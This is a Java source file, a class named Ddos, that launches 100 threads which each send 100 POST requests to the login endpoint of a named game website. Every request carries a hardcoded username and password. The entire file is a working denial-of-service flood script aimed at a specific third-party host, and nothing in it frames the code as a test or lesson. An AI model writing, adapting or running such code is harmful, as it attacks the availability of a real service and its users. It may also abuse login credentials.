package net;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.concurrent.atomic.AtomicInteger;

public class Ddos {

	private static final HttpClient.Builder builder = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(15));

	public static void main(String[] args) throws Exception {
		AtomicInteger progress = new AtomicInteger();
		for (int i = 0; i < 100; i++) {
			new Thread() {
				@Override
				public final void run() {
					for (int j = 0; j < 100; j++) {
						doRequest("https://skydex-game.ru/auth/", "{\"login\":\"W3E\",\"password\":\"kpdt891ns23y19lg\"}".getBytes());
						int p = progress.incrementAndGet();
						if (p % 20 == 0) {
							System.out.println(p);
						}
					}
				}
			}.start();
		}
	}

	public static void doRequest(String url, byte[] requestBody) {
		try {
			HttpClient client = builder.build();
			HttpRequest request = HttpRequest.newBuilder(URI.create(url)).POST(HttpRequest.BodyPublishers.ofByteArray(requestBody)).build();
			client.send(request, ri -> HttpResponse.BodySubscribers.ofByteArray());
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
